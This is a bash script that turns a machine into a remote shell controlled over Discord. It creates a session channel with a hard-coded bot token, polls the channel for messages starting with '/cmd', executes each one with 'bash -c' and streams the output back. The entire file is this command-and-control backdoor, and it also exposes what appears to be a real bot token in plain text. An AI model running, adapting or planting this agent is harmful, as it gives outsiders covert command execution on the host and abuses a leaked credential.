#!/bin/bash

BOT_TOKEN="MTQxNTY3NzU1NDc2OTI2ODgyNg.GnjYT_.-HKG78y5D3kskpz8v50SiJJbNUcO0HDazS9tu8"
GUILD_ID="1415674125816434742"   # right-click server â†’ Copy Server ID


echo "ðŸ¤– Creating new session channel..."

# Random string generator
randstr() {
    tr -dc 'a-z0-9' </dev/urandom | head -c 6
}

CHANNEL_NAME="sess_$(randstr)"

# Create channel via Discord API
resp=$(curl -s -X POST "https://discord.com/api/v10/guilds/$GUILD_ID/channels" \
  -H "Authorization: Bot $BOT_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"name\": \"$CHANNEL_NAME\", \"type\": 0}")

# Extract channel ID (pure Bash)
CHANNEL_ID=$(echo "$resp" | grep -o '"id":"[^"]*"' | head -n1 | cut -d'"' -f4)

if [ -z "$CHANNEL_ID" ]; then
    echo "âŒ Failed to create channel: $resp"
    exit 1
fi

echo "âœ… Created channel #$CHANNEL_NAME ($CHANNEL_ID)"
echo "ðŸ¤– Listening in channel $CHANNEL_ID ..."

LAST_SEEN=""

# JSON escape helper (pure Bash)
json_escape() {
    local s="$1"
    s="${s//\\/\\\\}"    # backslashes
    s="${s//\"/\\\"}"    # quotes
    s="${s//$'\n'/\\n}"  # newlines
    echo "$s"
}

while true; do
    # Fetch last 5 messages
    msgs=$(curl -s -H "Authorization: Bot $BOT_TOKEN" \
        "https://discord.com/api/v10/channels/$CHANNEL_ID/messages?limit=5")

    # Loop through messages (pure Bash)
    IFS=$'\n'
    for msg in $(echo "$msgs" | grep -o '{[^}]*}'); do
        msg_id=$(echo "$msg" | grep -o '"id":"[^"]*"' | head -n1 | cut -d'"' -f4)
        content=$(echo "$msg" | grep -o '"content":"[^"]*"' | head -n1 | cut -d'"' -f4)

        # Skip already processed
        [[ "$msg_id" == "$LAST_SEEN" ]] && break

        echo "DEBUG: got message: '$content'"

        if [[ "$content" == /cmd* ]]; then
            cmd="${content#/cmd }"
            echo "âš¡ Running: $cmd"

            # --- stream output line by line ---
            bash -c "$cmd" 2>&1 | while IFS= read -r line; do
                [ -z "$line" ] && line="[no output]"
                ESCAPED=$(json_escape "$line")
                curl -s -X POST "https://discord.com/api/v10/channels/$CHANNEL_ID/messages" \
                    -H "Authorization: Bot $BOT_TOKEN" \
                    -H "Content-Type: application/json" \
                    -d "{\"content\": \"$ESCAPED\"}" >/dev/null
            done
        fi
    done

    # Remember newest message ID
    LAST_SEEN=$(echo "$msgs" | grep -o '"id":"[^"]*"' | head -n1 | cut -d'"' -f4)

    sleep 2
done